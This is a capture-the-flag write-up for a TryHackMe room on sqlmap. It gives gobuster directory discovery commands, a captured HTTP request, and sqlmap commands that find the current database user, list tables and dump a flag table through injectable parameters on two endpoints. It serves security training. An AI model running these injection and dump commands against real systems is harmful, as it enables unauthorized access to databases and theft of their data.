# sqlmap

{% embed url="https://tryhackme.com/room/sqlmap" %}

Upon visiting the webpage, I was greeted with a plain page without any useful external links or information.

### Finding the first directory

I used `gobuster` with a common word list from [Daniel Miessler's list](https://github.com/danielmiessler/SecLists):

```bash
$ gobuster dir -u http://<target>.com/ -w DanielMiesslerSecLists/Discovery/Web-Content/common.txt
```

But did not receive any positive results. From the description of the challenge, it appears that this application relates  to "_Blood Donations_". Thus, I tried the directory `/blood`, and it worked.

### SQL Injection with `sqlmap`

Navigating through the application while behind Burp suite proxy, I found 2 requests within the application that are potentially vulnerable to an SQL injection attack. This is due to the nature of the request being likely to return a value retrieved directly from the database.

1. **`POST /blood/nl-search.php`**

```http
POST /blood/nl-search.php HTTP/1.1
Host: 10.10.244.206
Content-Length: 16
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.244.206
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.244.206/blood/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=pdgklb30hibf0kp13ldkn888l0
Connection: keep-alive

blood_group=A%2B
```

```
$ sqlmap -r req.txt -p blood_group --current-user
```

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

```bash
$ sqlmap -r req.txt -p blood_group -D blood --tables
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

```bash
$ sqlmap -r req.txt -p blood_group -D blood -T flag --dump
```



<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



2. `GET blood/view.php?id=1`&#x20;

The outputs are the same for each options as the ones above respectively.&#x20;

```bash
$ sqlmap http://10.10.181.14/blood/view.php?id=1 --current-user
```

```bash
$ sqlmap http://10.10.181.14/blood/view.php?id=1 -D blood --tables
```

```bash
$ sqlmap http://10.10.181.14/blood/view.php?id=1 -D blood -T flag --dump
```
